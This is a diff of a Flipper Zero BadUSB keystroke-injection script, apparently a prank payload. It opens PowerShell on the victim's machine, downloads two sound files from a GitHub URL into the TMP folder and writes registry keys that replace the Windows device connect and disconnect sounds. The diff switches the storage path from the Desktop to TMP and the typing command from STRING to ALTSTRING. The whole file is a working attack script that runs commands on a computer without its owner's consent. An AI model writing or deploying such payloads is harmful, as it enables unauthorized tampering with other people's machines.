@@ -1,11 +1,14 @@
-DELAY 500
+REM This changes the device connect/disconnect sound for something unpleasing
+DELAY 300
 GUI r
-DELAY 500
+DELAY 300
 STRING powershell
 ENTER
+DELAY 300
+ALTSTRING $TmpPath = [System.Environment]::GetEnvironmentVariable("TMP"); Invoke-WebRequest -Uri https://github.com/estebanramos/FlipperZero-BadUSB/raw/main/Payloads/Troll/Device%20Connect/device-connected.wav -OutFile $TmpPath/dc.wav;  Invoke-WebRequest -Uri https://github.com/estebanramos/FlipperZero-BadUSB/raw/main/Payloads/Troll/Device%20Connect/device-disconnected.wav -OutFile $TmpPath/dd.wav
+ENTER
 DELAY 500
-STRING $DesktopPath = [Environment]::GetFolderPath("Desktop"); Invoke-WebRequest -Uri https://github.com/estebanramos/FlipperZero-BadUSB/raw/main/Payloads/Troll/Device%20Connect/device-connected.wav -OutFile $DesktopPath/dc.wav;  Invoke-WebRequest -Uri https://github.com/estebanramos/FlipperZero-BadUSB/raw/main/Payloads/Troll/Device%20Connect/device-disconnected.wav -OutFile $DesktopPath/dd.wav
-STRING $wshell = New-Object -ComObject WScript.Shell; $wshell.RegWrite("HKCU\AppEvents\Schemes\Apps\.Default\DeviceConnect\.Current\","$DesktopPath\dc.wav","REG_SZ");$wshell.RegWrite("HKCU\AppEvents\Schemes\Apps\.Default\DeviceDisconnect\.Current\","$DesktopPath\dd.wav","REG_SZ")
+ALTSTRING $wshell = New-Object -ComObject WScript.Shell; $wshell.RegWrite("HKCU\AppEvents\Schemes\Apps\.Default\DeviceConnect\.Current\","$TmpPath\dc.wav","REG_SZ");$wshell.RegWrite("HKCU\AppEvents\Schemes\Apps\.Default\DeviceDisconnect\.Current\","$TmpPath\dd.wav","REG_SZ")
 DELAY 500
 ENTER
 GUI d
